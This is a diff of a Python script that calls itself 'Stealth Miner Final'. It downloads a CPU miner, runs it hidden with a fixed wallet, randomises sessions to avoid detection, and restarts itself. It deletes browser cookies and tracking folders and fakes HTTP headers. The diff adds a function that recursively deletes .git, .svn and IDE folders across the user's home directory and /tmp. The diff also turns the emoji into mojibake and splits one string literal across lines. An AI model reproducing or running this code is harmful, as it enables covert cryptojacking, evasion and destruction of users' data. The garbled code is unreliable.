@@ -10,7 +10,6 @@ import shutil
 import sys
 import random
 
-# === KONFIGURASI === #
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
@@ -21,7 +20,6 @@ WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
 PASSWORD = "x"
 THREADS = os.cpu_count()
 
-# === TIMER === #
 MIN_DURATION = 300
 MAX_DURATION = 720
 MIN_PAUSE = 120
@@ -30,8 +28,6 @@ COOLDOWN_DURATION = 180
 cooldown_restart_counter = 0
 cooldown_restart_limit = 3
 cooldown_reset_time = time.time() + 3600
-
-# === FUNGSI UTILITAS === #
 
 def anti_suspend():
     while True:
@@ -79,7 +75,7 @@ def clean_myapp_data():
         if os.path.exists(path):
             try:
                 shutil.rmtree(path)
-                print(f"[🧹] Menghapus folder: {path}")
+                print(f"[馃Ч] Menghapus folder: {path}")
             except Exception as e:
                 print(f"[X] Gagal hapus {path}: {e}")
 
@@ -98,7 +94,7 @@ def clean_mining_artifacts():
                 if any(keyword in name.lower() for keyword in PATTERNS):
                     try:
                         os.remove(os.path.join(root, name))
-                        print(f"[🧹] Hapus file: {os.path.join(root, name)}")
+                        print(f"[馃Ч] Hapus file: {os.path.join(root, name)}")
                     except:
                         pass
 
@@ -114,7 +110,7 @@ def clean_browser_cookies():
         if os.path.isfile(path):
             try:
                 os.remove(path)
-                print(f"[🍪] Cookie dihapus: {path}")
+                print(f"[馃崻] Cookie dihapus: {path}")
             except:
                 pass
         elif os.path.isdir(path):
@@ -123,7 +119,7 @@ def clean_browser_cookies():
                     if "cookie" in file.lower():
                         try:
                             os.remove(os.path.join(root, file))
-                            print(f"[🍪] Cookie dihapus: {file}")
+                            print(f"[馃崻] Cookie dihapus: {file}")
                         except:
                             pass
 
@@ -137,18 +133,40 @@ def clean_tracking_artifacts():
         if os.path.exists(path):
             try:
                 shutil.rmtree(path)
-                print(f"[🧹] Tracking folder dihapus: {path}")
+                print(f"[馃Ч] Tracking folder dihapus: {path}")
             except:
                 pass
+
+def clean_source_control():
+    CONTROL_DIRS = [".git", ".svn", ".hg", ".bzr", ".idea", ".vscode", "__pycache__"]
+    BASE_DIRS = [
+        os.path.expanduser("~"),
+        os.path.expanduser("~/Downloads"),
+        os.path.expanduser("~/.cache"),
+        os.path.expanduser("~/.local/share"),
+        "/tmp"
+    ]
+    for base in BASE_DIRS:
+        if not os.path.exists(base):
+            continue
+        for root, dirs, files in os.walk(base):
+            for d in dirs:
+                if d in CONTROL_DIRS:
+                    path = os.path.join(root, d)
+                    try:
+                        shutil.rmtree(path)
+                        print(f"[馃梻锔廬 Kontrol sumber dihapus: {path}")
+                    except:
+                        pass
 
 def clean_miner_cache():
     try:
         if os.path.exists(TARFILE):
             os.remove(TARFILE)
-            print("[🧹] Menghapus arsip miner lama.")
+            print("[馃Ч] Menghapus arsip miner lama.")
         if os.path.exists(HIDDEN_DIR):
             shutil.rmtree(HIDDEN_DIR)
-            print("[🧹] Menghapus direktori binary tersembunyi.")
+            print("[馃Ч] Menghapus direktori binary tersembunyi.")
     except Exception as e:
         print(f"[X] Gagal bersihkan cache miner: {e}")
 
@@ -161,8 +179,6 @@ def fake_http_headers():
         "X-Forwarded-For: 127.0.0.1",
     ]
     os.environ["FAKE_HEADERS"] = "|".join(headers)
-
-# === MINING SESSION === #
 
 def run_one_session():
     os.makedirs(HIDDEN_DIR, exist_ok=True)
@@ -181,14 +197,14 @@ def run_one_session():
         hidden_path, "-a", "power2b", "-o", POOL,
         "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
+
     time.sleep(10)
     os.remove(TARFILE)
     start_time = time.time()
     while time.time() - start_time < duration:
         time.sleep(10)
         if is_cpu_100_percent():
-            print(f"[⛔] CPU 100%! Cooldown selama {COOLDOWN_DURATION} detik...")
+            print(f"[鉀擼 CPU 100%! Cooldown selama {COOLDOWN_DURATION} detik...")
             proc.terminate()
             try:
                 proc.wait(timeout=10)
@@ -198,45 +214,43 @@ def run_one_session():
             if should_restart():
                 restart_script()
             else:
-                print("[⚠️] Batas restart tercapai. Menunggu sesi berikutnya...")
+                print("[鈿狅笍] Batas restart tercapai.")
                 return
-    print("[✔️] Durasi sesi selesai. Menghentikan miner...")
+    print("[鉁旓笍] Durasi selesai. Menghentikan miner...")
     proc.terminate()
     try:
         proc.wait(timeout=10)
     except subprocess.TimeoutExpired:
         proc.kill()
 
-# === MAIN LOOP === #
-
 def main_loop():
     while True:
         clean_mining_artifacts()
         run_one_session()
         pause = random.randint(MIN_PAUSE, MAX_PAUSE)
-        print(f"[⏸️] Istirahat {pause} detik...\n")
+        print(f"[鈴革笍] Istirahat {pause} detik...
+")
         time.sleep(pause)
 
 def restart_script():
     try:
-        print("[🔁] Restart otomatis...")
+        print("[馃攣] Restart otomatis...")
         clean_miner_cache()
         clean_myapp_data()
         clean_mining_artifacts()
         time.sleep(5)
         subprocess.Popen([sys.executable] + sys.argv)
-        print("[🚀] Script telah di-restart.")
+        print("[馃殌] Script telah di-restart.")
         sys.exit(0)
     except Exception as e:
         print(f"[X] Gagal restart otomatis: {e}")
 
-# === EKSEKUSI === #
-
 if __name__ == "__main__":
-    print("🚀  Stealth Miner Final: Anti Suspend + Cookie Cleaner + Cooldown + Auto Restart")
+    print("馃殌  Stealth Miner Final")
     clean_myapp_data()
     clean_browser_cookies()
     clean_tracking_artifacts()
+    clean_source_control()
     fake_http_headers()
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
